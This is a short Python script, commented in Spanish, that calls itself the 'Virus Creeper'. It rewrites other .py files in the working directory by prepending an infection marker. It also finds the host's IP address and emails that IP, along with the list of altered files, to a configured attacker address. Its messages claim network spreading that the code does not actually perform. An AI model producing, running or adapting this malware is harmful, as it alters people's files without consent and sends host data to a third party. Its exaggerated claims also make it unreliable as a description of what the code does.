import socket
import sys
import os
import smtplib
from email.mime.text import MIMEText

DEST_EMAIL = '' #Aca pones tu email

def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  
        ip_address = s.getsockname()[0]  
        s.close()
        return ip_address
    except socket.error:
        return "No se pudo obtener la dirección IP"

def send_email(ip_address, files_infected, sender_email):
    try:
        msg = MIMEText(f"Información recopilada del Virus Creeper:\n\n"
                       f"Dirección IP: {ip_address}\n"
                       f"Archivos infectados:\n"
                       f"{', '.join(files_infected)}\n")

        msg['Subject'] = 'Informe del Virus Creeper'
        msg['From'] = sender_email
        msg['To'] = DEST_EMAIL

        smtp = smtplib.SMTP('localhost')  
        smtp.send_message(msg)
        smtp.quit()
        print(f"Información enviada a {DEST_EMAIL}")
    except Exception as e:
        print(f"No se pudo enviar el correo electrónico: {e}")

def creeper_virus():
    print("Virus Creeper iniciando...")

    ip_address = get_ip_address()
    print(f"Infectando máquinas en la red desde {ip_address}")

    print("Propagando a través de la red...")

    files_in_directory = os.listdir()
    files_infected = []
    last_infected_email = None

    for filename in files_in_directory:
        if filename.endswith(".py") and filename != sys.argv[0]:
            try:
                with open(filename, "r+") as file:
                    file_content = file.read()

                    if "creeper_virus" not in file_content:
                        file.seek(0, 0)
                        file.write(f'# Infected by Creeper Virus from {ip_address}\n\n' + file_content)
                        files_infected.append(filename)
                        last_infected_email = f"creeper@{filename.split('.')[0]}.infected.me"  

                        print(f"Infectado: {filename}")
            except Exception as e:
                print(f"No se pudo abrir o infectar: {filename}. Error: {e}")

    if last_infected_email:
        send_email(ip_address, files_infected, last_infected_email)
    else:
        print("No se infectaron archivos.")

    print("Infección completa.")

if __name__ == "__main__":
    creeper_virus()
